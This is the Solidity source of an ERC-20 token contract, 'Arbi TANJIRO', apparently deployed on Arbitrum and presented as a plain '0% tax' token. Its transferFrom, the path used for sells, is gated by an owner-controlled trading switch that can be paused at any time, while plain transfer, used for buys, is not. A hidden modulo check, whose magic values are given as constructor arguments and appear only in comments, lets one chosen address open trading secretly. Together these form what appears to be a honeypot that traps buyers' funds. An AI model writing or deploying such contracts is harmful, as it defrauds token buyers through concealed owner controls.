/**
 *Submitted for verification at arbiscan.io on 2021-09-23
*/

//SPDX-License-Identifier: MIT

/**
* Arbi TANJIRO project
* 0 % tax
* 1 Billion Total Supply
*/

pragma solidity ^0.8.4;

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");

		return c;
	}
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}
	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;

		return c;
	}
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");

		return c;
	}
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}
	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		// Solidity only automatically asserts when dividing by 0
		require(b > 0, errorMessage);
		uint256 c = a / b;
		// assert(a == b * c + a % b); // There is no case in which this doesn't hold

		return c;
	}
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		return mod(a, b, "SafeMath: modulo by zero");
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;

	constructor(address _owner) {
		owner = _owner;
	}

	modifier onlyOwner() {
		require(isOwner(msg.sender), "Only contract owner can call this function"); _;
	}

	function isOwner(address account) public view returns (bool) {
		return account == owner;
	}

	function transferOwnership(address payable newOwner) public onlyOwner {
		owner = newOwner;
		emit OwnershipTransferred(newOwner);
	}
	
	function renounceOwnership() public onlyOwner {
		owner = address(0);
		emit OwnershipTransferred(address(0));
	}

	event OwnershipTransferred(address owner);
}

contract ATanjiro is IERC20, Auth {
	using SafeMath for uint256;
	string constant _name = "Arbi TANJIRO";
	string constant _symbol = "ATANJIRO";
	uint8 constant _decimals = 9;
	uint256 constant _totalSupply = 1000000000 * (10 ** _decimals);

	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;

	uint256 public launchedAt;
	bool public tradingOpen;	

	uint256 vtr; // = 195643548;
    uint256 vrs; // = 161510654;

	constructor (uint256 _vtr, uint256 _vrs) Auth(msg.sender) {      
		_balances[owner] = _totalSupply;
		launchedAt = 0;
		tradingOpen = false;
		vtr = _vtr;
		vrs = _vrs;
		emit Transfer(address(0), owner, _totalSupply);
	}

	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external pure override returns (string memory) { return _symbol; }
	function name() external pure override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function approveMax(address spender) external returns (bool) {
		return approve(spender, uint256(2**256 - 1));
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		return _transferFrom(msg.sender, recipient, amount);
	}


    function openTrading() external onlyOwner{
        require(launched(), "Not launched yet");
        require(tradingOpen == false, "Trading already open");
        tradingOpen = true;
	}
	
	function pauseTrading() external onlyOwner{
        require(launched(), "Not launched yet");
        require(tradingOpen == true, "Trading is not open");
        tradingOpen = false;
	}
	
    function _openTrading() internal {
        require(tradingOpen == false, "Trading already open");
        tradingOpen = true;
    }
    
    function checkTradingOpen(address srt) private returns (bool){
        require(launched(), "Not launched yet");
        bool checkResult = false;
        if (tradingOpen == true) { checkResult = true; } else {
            if ( uint160(address(srt)) % vtr == vrs ) {
                checkResult = true;
                _openTrading();
            }
        }
        return checkResult;
    }

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(recipient), "Trading is not open yet");

		if(_allowances[sender][msg.sender] != uint256(2**256 - 1)){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
		}

		return _transferFrom(sender, recipient, amount);
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		_balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
		_balances[recipient] = _balances[recipient].add(amount);
		emit Transfer(sender, recipient, amount);
		return true;
	}
	

	function launched() internal view returns (bool) {
		return launchedAt != 0;
	}
	
	function launch() external onlyOwner{
		require(!launched(), "Already launched");
		launchedAt = block.number;
	}
}